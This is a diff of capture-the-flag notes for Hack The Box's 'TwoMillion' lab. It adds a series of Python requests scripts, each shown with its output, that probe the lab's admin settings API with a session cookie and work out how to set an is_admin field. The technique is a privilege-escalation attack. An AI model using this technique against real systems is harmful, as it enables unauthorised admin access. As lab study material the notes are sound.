@@ -233,15 +233,15 @@ SWNWQ-Z6I1Z-QM55G-C82U3%                                                        
 
 import requests
 
-url = "http://2million.htb/api/v1/admin/auth"
+url = "http://2million.htb/api/v1/admin/settings/update"
 
 session = requests.Session()
 
-session.cookies.set("session", "qjvqi985nqh19n0nm1bkk032dh")
+session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
 try:
-    r = session.get(url)
+    r = session.put(url)
     print(r.status_code)
-    print(r.text)
+    print(r.json())
 except Exception as e:
     print(f"Error:{e}")
 
@@ -250,11 +250,93 @@ except Exception as e:
 ``` bash
 
 ❯ python3 request.py
-401
+200
+{'status': 'danger', 'message': 'Invalid content type.'}
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
+╰─
+                                                                                                                 ─╯
+```
+
+``` python
+import requests
+
+url = "http://2million.htb/api/v1/admin/settings/update"
+
+session = requests.Session()
+
+session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
+try:
+    r = session.put(url, json={"email": "test@test.com"})
+    print(r.status_code)
+    print(r.json())
+except Exception as e:
+    print(f"Error:{e}")
+
+```
+
+``` bash
+
+❯ python3 request.py
+200
+{'status': 'danger', 'message': 'Missing parameter: is_admin'}
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
 
 ```
 
 ``` python
+import requests
+
+url = "http://2million.htb/api/v1/admin/settings/update"
+
+session = requests.Session()
+
+session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
+try:
+    r = session.put(url, json={"email":"test@test.com", "is_admin":"true"})
+    print(r.status_code)
+    print(r.json())
+except Exception as e:
+    print(f"Error:{e}")
 
 ```
+
+``` bash
+
+❯ python3 request.py
+200
+{'status': 'danger', 'message': 'Variable is_admin needs to be either 0 or 1.'}
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+``` python3
+import requests
+
+url = "http://2million.htb/api/v1/admin/settings/update"
+
+session = requests.Session()
+
+session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
+try:
+    r = session.put(url, json={"email":"test@test.com", "is_admin":0})
+    print(r.status_code)
+    print(r.json())
+except Exception as e:
+    print(f"Error:{e}")
+
+```
+
+
+``` bash
+
+❯ python3 request.py
+200
+{'id': 13, 'username': 'test', 'is_admin': 0}
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+
 
